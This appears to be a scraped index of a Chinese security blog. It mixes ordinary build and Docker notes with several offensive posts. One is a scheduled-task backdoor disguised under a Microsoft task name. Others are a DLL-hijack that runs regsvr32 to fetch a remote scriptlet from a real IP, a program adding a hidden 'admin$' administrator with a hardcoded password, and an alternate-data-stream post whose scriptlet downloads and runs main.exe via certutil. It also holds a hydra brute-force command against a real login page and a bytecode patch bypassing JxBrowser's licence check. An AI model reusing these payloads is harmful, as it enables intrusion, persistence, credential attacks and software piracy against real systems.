123.py import time while True: time.sleep(5) python -m compileall 123.py # output: __pycache__/123.cpython-313.pyc 注册任务 脚本（免杀） 123.vbs Set service = CreateObject(\u0026#34;Schedule.Service\u0026#34;) service.Connect Set file = CreateObject(\u0026#34;Scripting.FileSystemObject\u0026#34;).OpenTextFile(\u0026#34;123.xml\u0026#34;) text = file.ReadAll file.Close Set rootFolder = service.GetFolder(\u0026#34;\\\u0026#34;) rootFolder.RegisterTask \u0026#34;\\Microsoft\\Windows\\MemoryDiagnostic\\ProcessMemoryDiagnosticEvents\u0026#34;, text, 6, , , 5 cscript.exe //Nologo 123.vbs wscript.exe：输出至 Windows， cscript.exe：输出至 Console。 Reference https://ss64.com/vb/filesystemobject.html https://docs.microsoft.com/zh-cn/dotnet/api/microsoft.visualbasic.constants https://docs.microsoft.com/zh-cn/office/vba/language/reference/user-interface-help/filesystemobject-object https://github.com/DoctorLai/VBScript_Obfuscator 工具 schtasks.exe /create /tn \u0026#34;\\Microsoft\\Windows\\MemoryDiagnostic\\ProcessMemoryDiagnosticEvents\u0026#34; /f /xml 123.xml schtasks.exe /query /tn \u0026#34;\\Microsoft\\Windows\\MemoryDiagnostic\\ProcessMemoryDiagnosticEvents\u0026#34; /v /fo list schtasks.exe /delete /tn \u0026#34;\\Microsoft\\Windows\\MemoryDiagnostic\\ProcessMemoryDiagnosticEvents\u0026#34; /f ","permalink":"https://xhstormr.github.io/blog/posts/taskschd-backdoor/","summary":"","title":"计划任务 Backdoor"},{"content":"Updated on 2019-10-03\nhttps://github.com/tmux/tmux\nwget https://github.com/tmux/tmux/archive/master.zip unzip master.zip cd tmux-master/ yum groups install \u0026#39;Development Tools\u0026#39; yum install -y ncurses-devel libevent-devel sh autogen.sh ./configure \u0026amp;\u0026amp; make install ","permalink":"https://xhstormr.github.io/blog/posts/build-tmux/","summary":"","title":"构建 tmux"},{"content":"Updated on 2019-10-02\n#include \u0026lt;windows.h\u0026gt; #include \u0026lt;process.h\u0026gt; void msg(HWND hwnd, HINSTANCE hinst, LPTSTR lpCmdLine, int nCmdShow) { if (strlen(lpCmdLine) != 0) { MessageBox(NULL, lpCmdLine, \u0026#34;Title\u0026#34;, MB_OK); } } BOOL WINAPI DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: spawnlp(P_DETACH, \u0026#34;regsvr32.exe\u0026#34;, \u0026#34;regsvr32.exe\u0026#34;, \u0026#34;/s /u /i:http://47.98.135.65/main/main.xml scrobj.dll\u0026#34;, NULL); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } gcc 123.c -o 123.dll -shared -s rundll32 123.dll msg Hello World! objdump -x 123.dll objdump -h -j .edata 123.dll objdump -s -j .edata 123.dll ","permalink":"https://xhstormr.github.io/blog/posts/dll-hijacking/","summary":"","title":"DLL 劫持"},{"content":"Updated on 2019-10-01\nhttps://docs.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netuseradd\n#include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;lm.h\u0026gt; int main(int agrc, char *agrv[]) { USER_INFO_1 user; memset(\u0026amp;user, 0, sizeof(user)); user.usri1_name = L\u0026#34;admin$\u0026#34;; user.usri1_password = L\u0026#34;Leoasdzxc123.\u0026#34;; user.usri1_priv = USER_PRIV_USER; user.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD; user.usri1_comment = NULL; user.usri1_home_dir = NULL; user.usri1_script_path = NULL; LOCALGROUP_MEMBERS_INFO_3 member; memset(\u0026amp;member, 0, sizeof(member)); member.lgrmi3_domainandname = user.usri1_name; if (NetUserAdd(NULL, 1, (void *)\u0026amp;user, NULL) != NERR_Success) { puts(\u0026#34;NetUserAdd FAILED!\u0026#34;); return -1; } if (NetLocalGroupAddMembers(NULL, L\u0026#34;Administrators\u0026#34;, 3, (void *)\u0026amp;member, 1) != NERR_Success) { puts(\u0026#34;NetLocalGroupAddMembers FAILED!\u0026#34;); return -1; } return 0; } gcc 123.c -lnetapi32 -s ","permalink":"https://xhstormr.github.io/blog/posts/netuseradd-api/","summary":"","title":"Win32 NetUserAdd API"},{"content":"Updated on 2019-09-30\nregsvr32.exe /s /u /i:http://47.98.135.65/main/main.xml scrobj.dll cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:http://47.98.135.65/main/main.xml ^scrobj.dll \u0026gt; ...:payload.bat cmd.exe - \u0026lt; ...:payload.bat main.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;scriptlet\u0026gt; \u0026lt;registration classid=\u0026#34;{F0001111-0000-0000-0000-0000FEEDACDC}\u0026#34; \u0026gt; \u0026lt;script language=\u0026#34;VBScript\u0026#34;\u0026gt; \u0026lt;![CDATA[ CreateObject(\u0026#34;WScript.Shell\u0026#34;).Run _ \u0026#34;%ComSpec% /c cd /d %TEMP% \u0026amp;\u0026amp; \u0026#34; \u0026amp;_ \u0026#34;(IF NOT EXIST main.exe certutil.exe -urlcache -split -f http://47.98.135.65/main/main.exe) \u0026amp;\u0026amp; \u0026#34; \u0026amp;_ \u0026#34;certutil.exe -urlcache * delete \u0026amp; \u0026#34; \u0026amp;_ \u0026#34;main.exe r\u0026#34;, 0, false ]]\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;/registration\u0026gt; \u0026lt;/scriptlet\u0026gt; delete.bat del /f /a /q \\\\?\\%1 rd /s /q \\\\?\\%1 type cmd.exe \u0026gt; ...:cmd.exe wmic process call create D:\\Download\\...:cmd.exe echo winver \u0026gt; ...:run.txt cmd.exe - \u0026lt; ...:run.txt or echo WScript.CreateObject(\u0026#34;WScript.Shell\u0026#34;).Run \u0026#34;cmd /c for /f \u0026#34;\u0026#34;delims=,\u0026#34;\u0026#34; %i in (...:run.txt) do %i\u0026#34;, 0 \u0026gt; ...:run.vbs cscript ...:run.vbs Reference https://ss64.com/vb/shell.html https://attack.mitre.org/techniques/T1117/ https://docs.microsoft.com/zh-cn/dotnet/visual-basic/programming-guide/program-structure/how-to-break-and-combine-statements-in-code ","permalink":"https://xhstormr.github.io/blog/posts/ads/","summary":"","title":"Alternate Data Stream"},{"content":"Updated on 2019-08-18\nhttps://parrotlinux.org\nsystemctl restart ssh systemctl enable ssh echo deb https://mirrors.tuna.tsinghua.edu.cn/parrot/ rolling main contrib non-free \u0026gt; /etc/apt/sources.list.d/parrot.list Mirror https://docs.parrotlinux.org/mirror-list/ https://mirrors.tuna.tsinghua.edu.cn/parrot/iso/4.7/Parrot-security-4.7_x64.iso ","permalink":"https://xhstormr.github.io/blog/posts/parrot/","summary":"","title":"Parrot"},{"content":"Updated on 2019-05-31\nhttps://source.android.google.cn/devices/tech/dalvik/dex-format\nhttps://source.android.google.cn/devices/tech/dalvik/dalvik-bytecode\nfrida-trace -U -i *SizeOfClassWithoutEmbeddedTables* com.saicmotor.tocapp frida -U -f com.saicmotor.tocapp -l 123.js --no-pause --runtime=v8 var module = Module.getExportByName(\u0026#39;libart.so\u0026#39;, \u0026#39;_ZN3art11ClassLinker32SizeOfClassWithoutEmbeddedTablesERKNS_7DexFileERKNS1_8ClassDefE\u0026#39;) var dumped_dex = [] Interceptor.attach(module, { onEnter: function (args) { var dex_file = args[1].add(0x04).readPointer() // 由于类中含有虚函数，跳过 vfptr，32 位加 4，64 位加 8 var dex_file_size = dex_file.add(0x20).readUInt() var dex_header_size = dex_file.add(0x24).readUInt() for (var i = 0; i \u0026lt; dumped_dex.length; i++) { if(dumped_dex[i] == dex_file_size) return } // console.log(JSON.stringify(this.context)) // console.log(hexdump(dex_file, {length: 16})) console.log(dex_file.readCString()) console.log(dex_file_size) console.log(dex_header_size) console.log(\u0026#39;---------\u0026#39;) var file = new File(\u0026#39;/mnt/sdcard/Download/\u0026#39; + dex_file_size + \u0026#39;.dex\u0026#39;, \u0026#39;wb\u0026#39;) file.write(dex_file.readByteArray(dex_file_size)) file.flush() file.close() dumped_dex.push(dex_file_size) }, onLeave: function (retval) { } }) /* C: args[0-n] = arguments C++: args[0] = this, args[1-n] = arguments ObjC: args[0] = self, args[1] = selector, args[2-n] = arguments */ 进制转换 ---- busybox printf %x 32 # decimal -\u0026gt; hex busybox printf %d 0x20 # hex -\u0026gt; decimal 查看符号表 ---- nm.exe libart.so 解码 C++ 函数名 ---- c++filt.exe _ZN3art11ClassLinker32SizeOfClassWithoutEmbeddedTablesERKNS_7DexFileERKNS1_8ClassDefE ---- art::ClassLinker::SizeOfClassWithoutEmbeddedTables(art::DexFile const\u0026amp;, art::DexFile::ClassDef const\u0026amp;) 下载至电脑 ---- adb pull /mnt/sdcard/Download/ D:\\Download\\DEX Reference https://android.googlesource.com/platform/art/+/refs/tags/android-9.0.0_r39/runtime/class_linker.h#856 https://android.googlesource.com/platform/art/+/refs/tags/android-9.0.0_r39/libdexfile/dex/dex_file.h#68 C++ 内存布局： https://www.cnblogs.com/churi/p/4480221.html https://www.cnblogs.com/wangsicongde/p/7599243.html https://www.cnblogs.com/DylanWind/archive/2009/01/12/1373919.html https://blog.csdn.net/susershine/article/details/17020397 ","permalink":"https://xhstormr.github.io/blog/posts/dex-unpack/","summary":"","title":"Android DEX Unpack"},{"content":"Updated on 2019-05-29\nhttps://frida.re/docs/javascript-api/#java\nPython https://npm.taobao.org/mirrors/python md 123 \u0026amp;\u0026amp; ^ curl -kL https://npm.taobao.org/mirrors/python/3.7.5/python-3.7.5-embed-amd64.zip | busybox unzip - -d 123 \u0026amp;\u0026amp; ^ cd 123 \u0026amp;\u0026amp; ^ curl -k https://raw.githubusercontent.com/pypa/get-pip/master/get-pip.py | python - \u0026#34;--index-url=https://mirrors.aliyun.com/pypi/simple/\u0026#34; \u0026amp;\u0026amp; ^ busybox sed -i \u0026#34;s/#import/import/\u0026#34; python37._pth Frida https://github.com/frida/frida/releases/latest # Install from Wheel python -m pip install --index-url=https://mirrors.aliyun.com/pypi/simple/ --upgrade frida-tools # Install from Egg wget https://mirrors.aliyun.com/pypi/packages/ab/44/eda688668b780277cc7f9306f02c3dea41d95f91f2404493ddf00b96187f/frida-14.2.2-py3.8-win-amd64.egg -P C:/Users/leo/ python -m easy_install --index-url=https://mirrors.aliyun.com/pypi/simple/ --upgrade frida-tools ADB https://dl.google.com/android/repository/repository2-1.xml curl -k https://dl.google.com/android/repository/platform-tools_r29.0.1-windows.zip | busybox unzip - Setup adb devices -l adb push D:/Download/frida-server /data/local/tmp/ adb shell \u0026#34;getprop ro.product.cpu.abi\u0026#34; adb shell \u0026#34;chmod 755 /data/local/tmp/frida-server\u0026#34; adb shell \u0026#34;su -c /data/local/tmp/frida-server -D -l 0.0.0.0\u0026#34; frida-ps -U frida -U com.example.leo.myapplication -l 123.js --runtime=v8 Java.perform(function () { Java.enumerateClassLoaders({ onMatch: function (loader) { console.log(loader) }, onComplete: function () { console.log(\u0026#39;------\u0026#39;) } }) Java.enumerateLoadedClasses({ onMatch: function (className) { if (className.includes(\u0026#39;com/example\u0026#39;)) { console.log(className) } }, onComplete: function () { console.log(\u0026#39;------\u0026#39;) } }) var TargetClass = Java.use(\u0026#39;com.example.leo.myapplication.MainActivity\u0026#39;) TargetClass.isModuleActive.implementation = function () { console.log(\u0026#39;isModuleActive\u0026#39;) return this.isModuleActive() } }) const loging = (input, kwargs) =\u0026gt; { kwargs = kwargs || {} let level = kwargs[\u0026#39;l\u0026#39;] || \u0026#39;log\u0026#39; let indent = kwargs[\u0026#39;i\u0026#39;] ? 2 : null if (typeof input === \u0026#39;object\u0026#39;) { input = JSON.stringify(input, null, indent) } console[level](input) } const printStackTrace = () =\u0026gt; { let log = Java.use(\u0026#39;android.util.Log\u0026#39;) let exception = Java.use(\u0026#39;java.lang.Exception\u0026#39;) loging(log.getStackTraceString(exception.$new()), { l : \u0026#39;warn\u0026#39; }) } const unique = arr =\u0026gt; Array.from(new Set(arr)) const traceClass = className =\u0026gt; { let clazz = Java.use(className) let methods = clazz.class.getDeclaredMethods().map(method =\u0026gt; method.getName()) unique(methods).forEach(methodName =\u0026gt; traceMethod(className, methodName)) } const traceMethod = (className, methodName) =\u0026gt; { let clazz = Java.use(className) let targetClassMethod = className + \u0026#39;.\u0026#39; + methodName loging(targetClassMethod) for (const method of clazz[methodName].overloads) { method.implementation = function() { let log = { \u0026#39;method\u0026#39; : targetClassMethod, args : [] } for (const argument of arguments) { log.args.push(argument) } let ret = method.apply(this, arguments) log.ret = ret loging(log, { i : false }) printStackTrace() return ret } } } const hooks = [ { class : \u0026#39;javax.crypto.Cipher\u0026#39;, method : \u0026#39;doFinal\u0026#39; }, { class : \u0026#39;com.wonders.common.utils.e\u0026#39;, method : null }, { class : \u0026#39;com.wonders.common.utils.o\u0026#39;, method : null }, { class : \u0026#39;com.wonders.account.utils.e\u0026#39;, method : null }, { class : \u0026#39;com.wonders.account.utils.a\u0026#39;, method : null }, ] Java.perform(() =\u0026gt; { Java.enumerateLoadedClasses({ onMatch : className =\u0026gt; { for (const hook of hooks) { if (hook.class.includes(className)) { hook.method ? traceMethod(hook.class, hook.method) : traceClass(hook.class) } } }, onComplete : () =\u0026gt; console.log(\u0026#39;------\u0026#39;) }) }) console.log(\u0026#39;------\u0026#39;) Reference https://github.com/hluwa/frida-dexdump https://github.com/FrenchYeti/dexcalibur https://github.com/dweinstein/awesome-frida https://github.com/iddoeldor/frida-snippets https://github.com/deathmemory/FridaContainer https://github.com/deathmemory/fridaRegstNtv https://www.npmjs.com/package/@types/frida-gum https://cdn.npm.taobao.org/@types/frida-gum/-/@types/frida-gum-16.2.1.tgz ","permalink":"https://xhstormr.github.io/blog/posts/frida/","summary":"","title":"Frida"},{"content":"Updated on 2019-05-10\nOpenSSL\nStep docker pull gcc:latest curl https://mirrors.cloud.tencent.com/openssl/source/openssl-1.1.1e.tar.gz | tar -xz \u0026amp;\u0026amp; cd openssl-1.1.1b docker run --rm -v `pwd`:`pwd` -w `pwd` gcc:latest sh -c \u0026#39;mkdir build \u0026amp;\u0026amp; cd build \u0026amp;\u0026amp; ../config no-deprecated no-shared no-tests -static --prefix=`pwd`/123 \u0026amp;\u0026amp; make install_sw\u0026#39; ","permalink":"https://xhstormr.github.io/blog/posts/docker-build-openssl/","summary":"","title":"构建 OpenSSL"},{"content":"Updated on 2019-04-04\nLinux curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo yum makecache yum update -y timedatectl set-timezone Asia/Shanghai date +%s -s @1602842120 hwclock -w Docker https://docs.docker.com/reference/ https://docs.docker.com/engine/reference/builder/ https://docs.docker.com/engine/reference/commandline/docker/ https://docs.docker.com/engine/reference/commandline/dockerd/ curl -fsSL https://get.docker.com | bash -s -- docker --mirror Aliyun mkdir -p /etc/docker echo -e \u0026#39;{\\n\u0026#34;userland-proxy\u0026#34;: false,\\n\u0026#34;registry-mirrors\u0026#34;: [\u0026#34;https://docker.mirrors.ustc.edu.cn\u0026#34;]\\n}\u0026#39; \u0026gt; /etc/docker/daemon.json systemctl start docker systemctl enable docker systemctl status docker usermod -aG docker leo docker ps -a #查看容器 docker images #查看镜像 docker network ls #查看网络 docker rm -fv gitlab #停止并删除容器、卷 docker rm `docker ps -a -q` #删除已停止的容器 docker rmi gitlab/gitlab-ce #删除镜像 docker image prune -f #清除未使用镜像 docker logs -f gitlab #查看容器日志 docker exec -it gitlab sh #获得容器 Shell docker system info #查看系统信息 docker system df #查看磁盘占用 docker system prune --volumes #清除未使用数据 Docker Compose https://docs.docker.com/compose/reference/ https://docs.docker.com/compose/compose-file/ https://github.com/compose-spec/compose-spec/blob/master/spec.md sudo curl -Lf https://github.com/docker/compose/releases/download/1.24.0/run.sh -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose docker-compose version #查看版本 docker-compose down -v #停止并删除容器、网络、卷 docker-compose logs -f #查看容器日志 docker-compose exec gitlab sh #获得容器 Shell GitLab + Traefik + Portainer https://docs.gitlab.com/omnibus/docker/ https://doc.traefik.io/traefik/routing/providers/docker/ https://portainer.readthedocs.io/en/stable/configuration.html docker-compose pull docker-compose up -d docker-compose ps docker-compose exec runner gitlab-runner register docker-compose.yml version: \u0026#39;3\u0026#39; services: gitlab: image: gitlab/gitlab-ce:latest restart: always environment: GITLAB_OMNIBUS_CONFIG: | gitlab_rails[\u0026#39;gitlab_shell_ssh_port\u0026#39;] = 5022 external_url \u0026#39;${GITLAB_SERVER_URL}\u0026#39; registry_external_url \u0026#39;${GITLAB_REGISTRY_URL}\u0026#39; registry_nginx[\u0026#39;ssl_certificate\u0026#39;] = \u0026#34;/certs/domain.crt\u0026#34; registry_nginx[\u0026#39;ssl_certificate_key\u0026#39;] = \u0026#34;/certs/domain.key\u0026#34; ports: - \u0026#39;5022:22\u0026#39; - \u0026#39;5100:5100\u0026#39; volumes: - ./certs:/certs - gitlab_config:/etc/gitlab - gitlab_logs:/var/log/gitlab - gitlab_data:/var/opt/gitlab labels: - traefik.http.services.gitlab.loadbalancer.server.port=80 - traefik.http.routers.gitlab.rule=PathPrefix(`/git/`) runner: image: gitlab/gitlab-runner:latest restart: always environment: CI_SERVER_URL: ${GITLAB_SERVER_URL} REGISTRATION_TOKEN: ${RUNNER_REGISTRATION_TOKEN} REGISTER_NON_INTERACTIVE: \u0026#39;true\u0026#39; RUNNER_EXECUTOR: docker DOCKER_IMAGE: alpine:latest volumes: - runner_data:/etc/gitlab-runner - /var/run/docker.sock:/var/run/docker.sock labels: - traefik.enable=false depends_on: - gitlab portainer: image: portainer/portainer:latest restart: always command: -H unix:///var/run/docker.sock --admin-password ${PORTAINER_ADMIN_PASSWORD} volumes: - portainer_data:/data - /var/run/docker.sock:/var/run/docker.sock labels: - traefik.http.services.portainer.loadbalancer.server.port=9000 - traefik.http.routers.portainer.rule=PathPrefix(`/portainer/`) - traefik.http.routers.portainer.middlewares=portainer-stripprefix - traefik.http.middlewares.portainer-stripprefix.stripprefix.prefixes=/portainer/ traefik: image: traefik:latest restart: always ports: - \u0026#39;80:80\u0026#39; command: --api --providers.docker volumes: - /var/run/docker.sock:/var/run/docker.sock labels: - traefik.http.routers.traefik.service=api@internal - traefik.http.routers.traefik.rule=PathPrefix(`/traefik/`) - traefik.http.routers.traefik.middlewares=traefik-stripprefix,traefik-basicauth - traefik.http.middlewares.traefik-stripprefix.stripprefix.prefixes=/traefik/ - traefik.http.middlewares.traefik-basicauth.basicauth.removeheader=true - traefik.http.middlewares.traefik-basicauth.basicauth.users=${TRAEFIK_BASIC_AUTH} volumes: gitlab_config: gitlab_logs: gitlab_data: runner_data: portainer_data: .env GITLAB_SERVER_URL=http://192.168.8.128/git/ GITLAB_REGISTRY_URL=https://192.168.8.128:5100 RUNNER_REGISTRATION_TOKEN=123 TRAEFIK_BASIC_AUTH=123:$2y$05$80HqrqBOoNaabteix3gYJ.S0kT.HP6sw5GjOplRfGhGezth0yL78y PORTAINER_ADMIN_PASSWORD=$2y$05$80HqrqBOoNaabteix3gYJ.S0kT.HP6sw5GjOplRfGhGezth0yL78y 配置 sudoers visudo -f /etc/sudoers.d/123 ---- leo ALL=(ALL) ALL 配置 Docker Registry 证书 mkdir -p certs openssl req \\ -config /etc/pki/tls/openssl.cnf \\ -addext \u0026#39;subjectAltName=IP:192.168.8.128\u0026#39; \\ -newkey rsa:4096 -nodes -sha256 -keyout certs/domain.key \\ -x509 -days 365 -out certs/domain.crt mkdir -p /etc/docker/certs.d/192.168.8.128:5100 cp certs/domain.crt /etc/docker/certs.d/192.168.8.128:5100/ca.crt https://www.openssl.org/docs/manmaster/man1/req.html 基本身份认证 htpasswd -nbB 123 123456 https://httpd.apache.org/docs/current/programs/htpasswd.html 本地容器之间若通过 HostIP:Port 访问对方，需要防火墙放行对应端口 systemctl status firewalld firewall-cmd --state firewall-cmd --add-service=http --permanent firewall-cmd --reload firewall-cmd --list-all firewall-cmd --add-port=80/tcp --permanent firewall-cmd --remove-port=80/tcp --permanent 远程访问 Docker daemon systemctl edit docker --- [Service] ExecStart= ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock -H tcp://0.0.0.0 --- systemctl cat docker systemctl restart docker firewall-cmd --add-port=2375/tcp --permanent firewall-cmd --reload https://docker.mirrors.ustc.edu.cn/v2/gitlab/gitlab-ce/tags/list https://docker.mirrors.ustc.edu.cn/v2/gitlab/gitlab-ce/manifests/latest https://docker.mirrors.ustc.edu.cn/v2/gitlab/gitlab-ce/blobs/sha256:e04a2435a78d15beae8c317bb18cfc3bc556b8dcdb7d29b256971ad42ee06767 curl -sk https://docker.mirrors.ustc.edu.cn/v2/gitlab/gitlab-ce/manifests/latest | ^ jq -r .fsLayers[].blobSum | ^ busybox xargs -i echo curl -skI https://docker.mirrors.ustc.edu.cn/v2/gitlab/gitlab-ce/blobs/{} | ^ busybox sh | ^ busybox grep -i content-length https://docs.docker.com/registry/spec/api/ GitLab 控制台修改管理员密码 gitlab-rails console user = User.where(id:1).first user.password = \u0026#39;12345678\u0026#39; user.save! GitLab 升级 gitlab-ctl upgrade gitlab-ctl reconfigure gitlab-ctl restart gitlab-ctl status gitlab-ctl tail Reference https://docs.docker.com/samples/ https://github.com/wagoodman/dive Docker mirror https://dockerhub.azk8s.cn/v2/ https://hub-mirror.c.163.com/v2/ https://docker.mirrors.ustc.edu.cn/v2/ https://ustc-edu-cn.mirror.aliyuncs.com/v2/ https://cr.console.aliyun.com/cn-shanghai/instances/mirrors GitLab CI https://docs.gitlab.com/ee/ci/yaml/ https://docs.gitlab.com/ee/ci/variables/predefined_variables.html ","permalink":"https://xhstormr.github.io/blog/posts/git-ci/","summary":"","title":"Git + CI"},{"content":"Updated on 2019-03-01\nMSYS2\nhydra\nStep D:\\Work\\Download\\thc-hydra-master\u0026gt; pacman -Syu pacman -S --noconfirm --needed gcc make openssl-devel ./configure \u0026amp;\u0026amp; make hydra -V -F -L username.txt -P password.txt -o ok.txt -t 20 \u0026#39;http-post-form://222.69.159.53:80/cm_admin/login.aspx:txtloginid=^USER^\u0026amp;txtpsw=^PASS^:F=password incorrect!:H=User-Agent\\: wget\u0026#39; pacman -F jq.exe #搜索软件包（By File） pacman -Ss gcc #搜索软件包（By Name） pacman -Sg mingw-w64-x86_64-toolchain mingw-w64-i686-toolchain #查看软件组 echo \u0026#39;Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/msys/$arch/\u0026#39; \u0026gt; /etc/pacman.d/mirrorlist.msys echo \u0026#39;Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/i686/\u0026#39; \u0026gt; /etc/pacman.d/mirrorlist.mingw32 echo \u0026#39;Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/x86_64/\u0026#39; \u0026gt; /etc/pacman.d/mirrorlist.mingw64 pacman -Sy Reference 依赖： msys-2.0.dll：src | bin msys-z.dll：src | bin msys-ssl-1.1.dll, msys-crypto-1.1.dll：src | bin https://www.msys2.org/ https://packages.msys2.org/group/ https://mirrors.ustc.edu.cn/help/msys2.html https://github.com/msys2/MSYS2-packages/tree/master/pacman-mirrors ","permalink":"https://xhstormr.github.io/blog/posts/msys2-build-hydra/","summary":"","title":"构建 hydra"},{"content":"Updated on 2018-12-17\nhttps://www.teamdev.com/jxbrowser\nStep 反编译 lib/jxbrowser-6.22.1.jar。 搜索 BigInteger，定位至 bb.class。 修改方法 b 的返回值为 true。 Code javap -c bb.class ---- 输出： public class com.teamdev.jxbrowser.chromium.bb { ... public final boolean b(); Code: 0: new #25 // class java/math/BigInteger 3: dup 4: aload_0 ... 147: getstatic #39 // Field d:Ljava/math/BigInteger; 150: invokevirtual #86 // Method java/math/BigInteger.modPow:(Ljava/math/BigInteger;Ljava/math/BigInteger;)Ljava/math/BigInteger; 153: invokevirtual #84 // Method java/math/BigInteger.equals:(Ljava/lang/Object;)Z 156: istore_1 157: iload_1 158: ireturn ... } 通过修改字节码： iload_1 ireturn ⬇️ iconst_1 ireturn 通过修改 16 进制代码： 1B AC ⬇️ 04 AC ","permalink":"https://xhstormr.github.io/blog/posts/reverse-jxbrowser/","summary":"","title":"逆向 JxBrowser"},{"content":"Updated on 2018-10-13\ngcc\ncmake\nnpcap SDK\nnpcap DLL\ntcpdump\nStep D:\\Work\\Download\\tcpdump-master\u0026gt; type nul \u0026gt; PreLoad.cmake echo set(CMAKE_C_STANDARD 11 CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt; PreLoad.cmake echo set(CMAKE_C_STANDARD_REQUIRED ON CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo set(CMAKE_C_FLAGS \u0026#34;-s -Os\u0026#34; CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo set(CMAKE_EXE_LINKER_FLAGS \u0026#34;-static\u0026#34; CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo. \u0026gt;\u0026gt; PreLoad.cmake echo set(CMAKE_GENERATOR \u0026#34;MinGW Makefiles\u0026#34; CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo set(CMAKE_INSTALL_PREFIX \u0026#34;456\u0026#34; CACHE PATH \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo set(PCAP_INCLUDE_DIR \u0026#34;D:/Download/npcap-sdk/Include\u0026#34; CACHE PATH \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo set(PCAP_LIBRARY \u0026#34;D:/Download/npcap-sdk/Lib/x64/wpcap.lib\u0026#34; CACHE PATH \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake md 123 \u0026amp;\u0026amp; cd 123 \u0026amp;\u0026amp; cmake .. \u0026amp;\u0026amp; mingw32-make \u0026amp;\u0026amp; mingw32-make install Reference https://www.tcpdump.org/manpages/tcpdump.1.html npcap GCC Variadic Macros ","permalink":"https://xhstormr.github.io/blog/posts/cmake-build-tcpdump/","summary":"","title":"构建 tcpdump"},{"content":"Updated on 2018-07-20\nhttps://github.com/mybatis/generator\nstart.bat @ echo off if not exist mybatis-generator-core-1.3.7.jar curl -LROk https://jcenter.bintray.com/org/mybatis/generator/mybatis-generator-core/1.3.7/mybatis-generator-core-1.3.7.jar if not exist postgresql-42.2.4.jar curl -LROk https://jcenter.bintray.com/org/postgresql/postgresql/42.2.4/postgresql-42.2.4.jar md src\\main\\java md src\\main\\resources javac -cp mybatis-generator-core-1.3.7.jar; MyCommentGenerator.java javac -cp mybatis-generator-core-1.3.7.jar; MyResultMapGenerator.java java -cp mybatis-generator-core-1.3.7.jar; org.mybatis.generator.api.ShellRunner -configfile generatorConfig.xml -overwrite generatorConfig.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE generatorConfiguration PUBLIC \u0026#34;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\u0026#34;\u0026gt; \u0026lt;generatorConfiguration\u0026gt; \u0026lt;classPathEntry location=\u0026#34;postgresql-42.2.4.jar\u0026#34; /\u0026gt; \u0026lt;context id=\u0026#34;abc\u0026#34; targetRuntime=\u0026#34;MyBatis3DynamicSql\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;autoDelimitKeywords\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;property name=\u0026#34;javaFileEncoding\u0026#34; value=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;plugin type=\u0026#34;MyResultMapGenerator\u0026#34; /\u0026gt; \u0026lt;plugin type=\u0026#34;org.mybatis.generator.plugins.ToStringPlugin\u0026#34; /\u0026gt; \u0026lt;plugin type=\u0026#34;org.mybatis.generator.plugins.RowBoundsPlugin\u0026#34; /\u0026gt; \u0026lt;plugin type=\u0026#34;org.mybatis.generator.plugins.SerializablePlugin\u0026#34; /\u0026gt; \u0026lt;plugin type=\u0026#34;org.mybatis.generator.plugins.EqualsHashCodePlugin\u0026#34; /\u0026gt; \u0026lt;plugin type=\u0026#34;org.mybatis.generator.plugins.MapperAnnotationPlugin\u0026#34; /\u0026gt; \u0026lt;plugin type=\u0026#34;org.mybatis.generator.plugins.CaseInsensitiveLikePlugin\u0026#34; /\u0026gt; \u0026lt;plugin type=\u0026#34;org.mybatis.generator.plugins.FluentBuilderMethodsPlugin\u0026#34; /\u0026gt; \u0026lt;plugin type=\u0026#34;org.mybatis.generator.plugins.UnmergeableXmlMappersPlugin\u0026#34; /\u0026gt; \u0026lt;plugin type=\u0026#34;org.mybatis.generator.plugins.MapperConfigPlugin\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;targetPackage\u0026#34; value=\u0026#34;.\u0026#34; /\u0026gt; \u0026lt;property name=\u0026#34;targetProject\u0026#34; value=\u0026#34;src/main/resources\u0026#34; /\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;commentGenerator type=\u0026#34;MyCommentGenerator\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;suppressAllComments\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;property name=\u0026#34;addRemarkComments\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/commentGenerator\u0026gt; \u0026lt;jdbcConnection 